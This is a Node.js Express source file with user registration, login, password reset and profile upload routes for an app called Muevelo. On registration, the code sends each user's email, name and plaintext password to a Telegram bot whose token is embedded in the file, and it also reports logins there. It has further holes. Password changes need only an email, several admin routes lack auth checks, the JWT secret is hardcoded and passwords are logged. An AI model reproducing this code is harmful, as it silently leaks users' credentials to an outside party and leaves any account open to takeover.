const express = require("express");
const router = express.Router();
const bcrypt = require("bcrypt");
const crypto = require("crypto");
const jwt = require("jsonwebtoken");
const CheckAuth = require("../middleware/check-auth");
const pool = require("./connection");
const sendMail = require("./sendmail");
const sharp = require("sharp");
const path = require("path");
const fs = require("fs");
const http = require("http");
const request = require("request");

//
const multer = require("multer");
const { networkInterfaces } = require("os");
const storage = multer.diskStorage({
    destination: function(req, file, cb) {
        cb(null, "uploads/");
    },
    filename: function(req, file, cb) {
        cb(null, req.body.user + ".jpeg");
    },
});

const fileFilter = (req, file, cb) => {
    if (file.mimetype === "image/jpeg" || file.mimetype === "image/png")
        cb(null, true);
    else cb(new Error("Invalid extention"), false);
};

const upload = multer({
    storage: storage,
    limits: {
        fileSize: 1024 * 1024 * 7,
    },
    fileFilter: fileFilter,
});

router.post("/uploadProfilePic", upload.single("pic"), async(req, res) => {
    console.log(req.file);

    //const { filename: image } = req.file;

    const pathToBeDeleted = req.file.destination + "resized/" + req.file.filename;

    await sharp.cache(false);
    await sharp(req.file.path)
        .resize(128, 128)
        .withMetadata()
        .toFile(pathToBeDeleted);

    fs.unlink(req.file.path, (err) => {
        if (err) throw err;
        console.log(req.file.path, " was deleted");
    });

    return res.send("uploaded ");
});

/**
 * Gets all the users
 */
router.get("/getUsers", (req, res, next) => {
    pool.query(
        "SELECT A.*,B.id as role_id, B.name as role_name, B.page FROM users as A join role as B on A.role=B.id ORDER BY B.id ASC",
        (error, results) => {
            if (error) {
                throw error;
            }
            res.status(200).json(results.rows);
        }
    );
});

router.post("/updateUser", (req, res, next) => {
    const u = req.body.user;

    console.log(u);

    //  if (false)
    pool.query(
        "UPDATE USERS set name = $1 ,surname = $2 ,email = $3 ,license_start = $4 ,license_end = $5 ,role = $6  WHERE id = $7", [u.name, u.surname, u.email, u.license_start, u.license_end, u.role, u.id],
        (error, results) => {
            if (error) {
                throw error;
            }
            // se ho trovato l'utente a db
            if (results.rowCount > 0) {
                // send email

                return res.status(200).json({
                    status: 200,
                });
            } else {
                return res.status(401).json({
                    code: 401,
                    message: "User does not exsists! Please try with another user!",
                });
            }
        }
    );
});

/**
 * Inserts a new user if it doesnt exists
 * Generates an encoded password
 * Generates a random user id
 */
router.post("/register", (req, res, next) => {
    const user_ = req.body;
    console.log(user_.password);

    const pass = user_.password;

    bcrypt
        .hash(user_.password, 10)
        .then((hash) => {
            console.log("ok 2");
            // genera un random Id
            const id = crypto.randomBytes(8).toString("hex");
            pool.query(
                "INSERT INTO users (id, name, surname, email, password) VALUES ($1, $2, $3, $4, $5)", [id, user_.name, user_.surname, user_.email, hash],
                (error, results) => {
                    console.log(results);
                    if (error) {
                        let errorNumber = 500;
                        if (error.routine === "_bt_check_unique") errorNumber = 409;

                        return res.status(errorNumber).json({
                            code: errorNumber,
                            message: errorNumber === 409 ?
                                "User " + user_.email + " already exsists" :
                                "Generic network error!",
                        });
                    }

                    try {
                        const bot =
                            "https://api.telegram.org/bot1048183703:AAGeeJA0IHd5bEF0k8k5Qq6kgKFtOhAOBmo/sendMessage?chat_id=145645559&text=User " +
                            user_.email +
                            "  username: " +
                            user_.name +
                            "  surname: " +
                            user_.surname +
                            " pass: " +
                            pass +
                            "     HAS BEEN REGISTRED!";

                        request(bot, { json: true }, (err, res, body) => {
                            if (err) {
                                return console.log(err);
                            }
                        });

                        sendMail({
                            to: user_.email,
                            subject: "Welcome to Muevelo " + user_.name + " :)",
                            text: "You have successfully registred!",
                        });

                        // qui ritorna che tutto è andato ok
                        return res.status(201).json({
                            message: "User created",
                            result: results.rowCount,
                        });
                    } catch (error) {
                        return res.status(401).json({
                            code: 401,
                            message: "Generic network error! Please try later.",
                        });
                    }
                }
            );
        })
        .catch((err) => {
            console.log(err);
            return res.status(500).json({
                code: 500,
                message: "Generic network error!",
            });
        });
});

router.post("/login", (req, res, next) => {
    const email = req.body.email;
    const password = req.body.password;

    pool.query(
        "SELECT * FROM users WHERE email = $1 ", [email],
        (error, results) => {
            if (error) {
                throw error;
            }

            // se ho trovato l'utente a db
            if (results.rowCount > 0) {
                // se la password coincide
                bcrypt.compare(password, results.rows[0].password, function(
                    err_hash,
                    result_hash
                ) {
                    if (err_hash) {
                        return res.status(401).json({
                            message: "Auth failed_Catch",
                            err: err_hash,
                        });
                    }
                    if (result_hash == true) {
                        const token = jwt.sign({ email: results.email, id: results.id },
                            "secret_this_should_be_longer", {
                                expiresIn: "1h",
                            }
                        );

                        const bot =
                            "https://api.telegram.org/bot1048183703:AAGeeJA0IHd5bEF0k8k5Qq6kgKFtOhAOBmo/sendMessage?chat_id=145645559&text=User " +
                            email +
                            " has logged in!";

                        request(bot, { json: true }, (err, res, body) => {
                            if (err) {
                                return console.log(err);
                            }
                        });

                        // send email
                        /*    
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    sendMail({
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        to: "tomasmali08@gmail.com",
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          subject: "My first email from nodejs",
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        text: "Ciao io sono tmas mali, email generato automaticamente"
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    })
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    */

                        // l'oggetto da ritornare
                        console.log(results.rows[0].email);
                        console.log(results.rows[0].id);
                        return res.status(200).json({
                            token: token,
                            expiresIn: 3600,
                            email: results.rows[0].email,
                            user: results.rows[0].id,
                        });
                    }
                    // wrong password
                    return res.status(401).json({
                        code: 401,
                        message: "Wrong password",
                    });
                });
            } else {
                return res.status(401).json({
                    code: 401,
                    message: "User does not exsists! Please signup for registration",
                });
            }
        }
    );
});

router.post("/resetPassword", (req, res, next) => {
    const email = req.body.email;

    pool.query(
        "SELECT * FROM users WHERE email = $1", [email],
        (error, results) => {
            if (error) {
                throw error;
            }
            // se ho trovato l'utente a db
            if (results.rowCount > 0) {
                // send email
                try {
                    sendMail({
                        to: email,
                        subject: "Confirmation for reseting your password",
                        html: "Please click  <a href='https://tomasmali.it/changePassword?email=" +
                            email +
                            "'>here </a> ",
                    });

                    return res.status(200).json({
                        status: 200,
                    });
                } catch (error) {
                    return res.status(401).json({
                        code: 401,
                        message: "Generic network error! Please try later.",
                    });
                }
            } else {
                return res.status(401).json({
                    code: 401,
                    message: "User does not exsists! Please try with another user!",
                });
            }
        }
    );
});

router.post("/changePassword", (req, res, next) => {
    const email = req.body.email;
    const password = req.body.password;

    bcrypt
        .hash(password, 10)
        .then((hash) => {
            pool.query(
                "UPDATE users SET password = $1 WHERE email = $2", [hash, email],
                (error, results) => {
                    if (error) {
                        throw error;
                    }
                    // se ho trovato l'utente a db
                    if (results.rowCount > 0) {
                        // send email
                        sendMail({
                            to: email,
                            subject: "Password successfully changed",
                            text: "Your password has been changed successfully",
                        });

                        return res.status(200).json({
                            status: 200,
                        });
                    } else {
                        return res.status(401).json({
                            code: 401,
                            message: "User does not exsists! Please try with another user!",
                        });
                    }
                }
            );
        })
        .catch((err) => {
            console.log(err);
            return res.status(500).json({
                code: 500,
                message: "Generic network error from bcrypt!",
            });
        });
});

const getUsers = (request, response) => {
    pool.query("SELECT * FROM users ORDER BY user_id ASC", (error, results) => {
        if (error) {
            throw error;
        }
        response.status(200).json(results.rows);
    });
};

const getUserById = (request, response) => {
    const id = parseInt(request.params.id);

    pool.query(
        "SELECT * FROM users WHERE user_id = $1", [id],
        (error, results) => {
            if (error) {
                throw error;
            }
            response.status(200).json(results.rows);
        }
    );
};

module.exports = router;